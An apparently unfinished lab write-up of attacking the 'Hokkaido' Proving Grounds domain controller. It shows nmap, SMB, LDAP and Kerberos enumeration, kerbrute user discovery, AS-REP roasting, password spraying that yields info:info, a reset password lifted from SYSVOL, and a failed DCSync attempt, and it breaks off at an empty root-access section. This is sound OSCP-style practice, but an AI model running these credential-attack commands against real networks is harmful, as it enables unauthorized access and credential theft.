# Report - Hokkaido

- Author: Henry Post
- Target: Hokkaido
- Target IP: 192.168.53.40
- Attacker IP: 192.168.49.53
- Date: 05/13 /2026

## Executive Summary



### Recommendations


## Resources

- https://medium.com/@sakyb7/proving-grounds-hokkaido-tjnull-oscp-prep-ca34df1e6491


## Recon

I ran an nmap scan that enumerated their ports:

     nmap -sS -sV -p- hokkaido

```txt

???(kali?kali)-[~]
??$ nmap -sS -sV -p- hokkaido
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-13 23:58 +0000
Stats: 0:02:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 39.07% done; ETC: 00:03 (0:03:24 remaining)
Nmap scan report for hokkaido (192.168.53.40)
Host is up (0.00035s latency).
Not shown: 65502 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-14 00:03:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com, Site: Default-First-Site-Name)
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com, Site: Default-First-Site-Name)

```

Pretty chonky scan. Not sure where to start. Let's try IIS...
Nope. Default page. Let's try gobuster.

```
gobuster dir -u http://hokkaido:80/ -w /usr/share/wordlists/dirb/common.txt
```

Womp womp. `http://hokkaido/aspnet_client/` is the only find.
Let's try `dirb`.

```sh
dirb http://hokkaido/
```

Nothing.

We must need to attack SMB in some way. Let's try to list shares...

```sh
smbclient -L //hokkaido -N
# nope

smbclient -L //192.168.53.40 -N
```

Let's try `nbtscan`.

```sh
nbtscan 192.168.53.40
# nothing
```

Let's try `netexec`...

```sh
netexec smb hokkaido

<<EOF
???(kali?kali)-[~]
??$ netexec smb hokkaido
SMB         192.168.53.40   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:None) (Null Auth:True)
EOF
```

We might be able to connect further with `netexec`...

Let's ask `z.ai`.

```sh
netexec smb 192.168.53.40 --users
# no users

rpcclient -U "" -N 192.168.53.40
enumdomains # NT_STATUS_ACCESS_DENIED
enumdomusers # NT_STATUS_ACCESS_DENIED
querydominfo # NT_STATUS_ACCESS_DENIED

ldapsearch -x -H ldap://192.168.53.40 -s base namingcontexts

<<EOF
???(kali?kali)-[~]
??$ ldapsearch -x -H ldap://192.168.53.40 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=hokkaido-aerospace,DC=com
namingcontexts: CN=Configuration,DC=hokkaido-aerospace,DC=com
namingcontexts: CN=Schema,CN=Configuration,DC=hokkaido-aerospace,DC=com
namingcontexts: DC=DomainDnsZones,DC=hokkaido-aerospace,DC=com
namingcontexts: DC=ForestDnsZones,DC=hokkaido-aerospace,DC=com

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

EOF

ldapsearch -x -H ldap://192.168.53.40 -b "DC=hokkaido-aerospace,DC=com" "(objectClass=user)" sAMAccountName
# fails, 000004DC: LdapErr: DSID-0C090CF8


```

We can check for a DNS Zone Transfer.

```sh
dig axfr @192.168.53.40 hokkaido-aerospace.com
# fails
```

We can test to see if we can access MSSQL.

```sh
impacket-mssqlclient -windows-auth hokkaido-aerospace.com/guest:guest@192.168.53.40
# fails: [-] ERROR(DC\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.

```

No usernames yet.

We decide to run a script scan with `nmap`...

```txt
???(kali?kali)-[~]
??$ nmap -sC hokkaido
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-14 00:20 +0000
Nmap scan report for hokkaido (192.168.53.40)
Host is up (0.00036s latency).
Not shown: 985 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2026-05-13T23:56:37
|_Not valid after:  2027-05-13T23:56:37
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2026-05-13T23:56:37

```

It doesn't really tell us anything we don't already know...

Sent the above to `z.ai`, it suggested I use a Kerberos brute-force tool.

```sh
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
mv kerbrute_linux_amd64 ./kerbrute
chmod +x ./kerbrute

./kerbrute userenum -d hokkaido-aerospace.com --dc 192.168.53.40 /usr/share/seclists/Usernames/cirt-default-usernames.txt

<<EOF
2026/05/14 00:24:50 >  [+] VALID USERNAME:       ADMINISTRATOR@hokkaido-aerospace.com
2026/05/14 00:24:50 >  [+] VALID USERNAME:       Administrator@hokkaido-aerospace.com
2026/05/14 00:24:50 >  [+] VALID USERNAME:       INFO@hokkaido-aerospace.com
2026/05/14 00:24:50 >  [+] VALID USERNAME:       administrator@hokkaido-aerospace.com
EOF
```

Cool beans. We found two real users.

```txt
Administrator
INFO
```

Asking our shiny chrome overlord `z.ai` for more advice, it suggests AS-REP Roasting.

```sh
echo "administrator" > users.txt
echo "info" >> users.txt

impacket-GetNPUsers hokkaido-aerospace.com/ -dc-ip 192.168.53.40 -usersfile users.txt
# rip
<<EOF
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User info doesn't have UF_DONT_REQUIRE_PREAUTH set
EOF
```

Okay. So.

```sh
netexec smb 192.168.53.40 -u users.txt -p 'info'

<<EOF
???(kali?kali)-[~]
??$ netexec smb 192.168.53.40 -u users.txt -p 'info'

SMB         192.168.53.40   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.53.40   445    DC               [-] hokkaido-aerospace.com\administrator:info STATUS_LOGON_FAILURE
SMB         192.168.53.40   445    DC               [+] hokkaido-aerospace.com\info:info 

EOF
```

It's just `info:info`. Sweet!

We get MySQL shell.

```sh
impacket-mssqlclient hokkaido-aerospace.com/info:info@192.168.53.40 -windows-auth
```

```sql
SELECT IS_SRVROLEMEMBER('sysadmin'); --no

/*
SQL (HAERO\info  guest@master)> EXEC sp_configure 'show advanced options', 1;
ERROR(DC\SQLEXPRESS): Line 105: User does not have permission to perform this action.
*/

--we cannot use xp_cmdshell sadly
```

Let's try enumerating shares...

```sh
smbclient //192.168.53.40/C$ -U 'info%info' # fails
smbclient //192.168.53.40/ADMIN$ -U 'info%info' # fails

smbclient -L //192.168.53.40 -U 'info%info'

<<EOF
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        homes           Disk      user homes
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        UpdateServicesPackages Disk      A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
        WsusContent     Disk      A network share to be used by Local Publishing to place published content on this WSUS system.
        WSUSTemp        Disk      A network share used by Local Publishing from a Remote WSUS Console Instance.
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.53.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

EOF
```

Neat. Let's spider the shares with `smbmap`.

```sh
# note: IP changed to 192.168.57.40
smbmap -H 192.168.57.40 -u info -p info #-R is not a flag

<<EOF
[+] IP: 192.168.57.40:445       Name: 192.168.57.40             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        homes                                                   READ, WRITE     user homes
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        UpdateServicesPackages                                  READ ONLY       A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
        WsusContent                                             READ ONLY       A network share to be used by Local Publishing to place published content on this WSUS system.
        WSUSTemp                                                NO ACCESS       A network share used by Local Publishing from a Remote WSUS Console Instance.

EOF

# check SYSVOL
smbclient //192.168.57.40/SYSVOL -U 'info%info'

<<EOF
smb: \hokkaido-aerospace.com\Policies\> dir
  .                                   D        0  Sat Nov 25 13:11:13 2023
  ..                                  D        0  Sat Nov 25 13:17:33 2023
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sat Nov 25 13:11:13 2023
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sat Nov 25 13:11:13 2023

                7699711 blocks of size 4096. 1918210 blocks available

EOF

# looks like we have some password_reset.txt file
# getting file \hokkaido-aerospace.com\scripts\temp\password_reset.txt of size 27 as password_reset.txt (3.3 KiloBytes/sec) (average 3.3 KiloBytes/sec)
# Start123!

# sadly, SYSVOL showed no groups.xml files.
```

We stole a cred, `Start123!`... I wonder if we can login as Administrator now.

```sh
smbclient //192.168.57.40/SYSVOL -U 'Administrator%Start123!' # fails

impacket-mssqlclient 'hokkaido-aerospace.com/Administrator:Start123!@192.168.57.40' -windows-auth # fails

smbclient //192.168.57.40/homes -U 'info%info' # waste of time

smbclient "//192.168.57.40/IPC$" -U 'info%info' # empty
```

Let's see if we can find any other users.

```sh
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
mv kerbrute_linux_amd64 ./kerbrute
chmod +x ./kerbrute

./kerbrute userenum -d hokkaido-aerospace.com --dc 192.168.57.40 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

<<EOF

info
administrator
discovery
maintenance

EOF
```

Neat, we found a few more. Time to brute-force SMB login.

```sh
echo "info" > users.txt
echo "administrator" >> users.txt
echo "discovery" >> users.txt
echo "maintenance" >> users.txt

netexec smb 192.168.57.40 -u users.txt -p 'Start123!'

<<EOF
SMB         192.168.57.40   445    DC               [+] hokkaido-aerospace.com\discovery:Start123! 
EOF
```

Looks like `discovery:Start123!` is a legit login.

Let's see if it can login to the SQL server.

```sh
impacket-mssqlclient 'hokkaido-aerospace.com/discovery:Start123!@192.168.57.40' -windows-auth
# login works

SELECT IS_SRVROLEMEMBER('sysadmin'); # nope. can't use xp_cmdshell

EXEC sp_configure 'show advanced options', 1; RECONFIGURE; # fails

SELECT * FROM fn_my_permissions(NULL, 'SERVER');
<<EOF

entity_name   subentity_name   permission_name     
-----------   --------------   -----------------   
server                         CONNECT SQL         
server                         VIEW ANY DATABASE   

EOF
```

Let's try a DC Sync attack.

```sh
nxc smb 192.168.57.40 -u discovery -p 'Start123!' --ntds # fails.
```

Alright. I'm stuck.

https://medium.com/@sakyb7/proving-grounds-hokkaido-tjnull-oscp-prep-ca34df1e6491

Okay. So apparently we need to 
## Root access


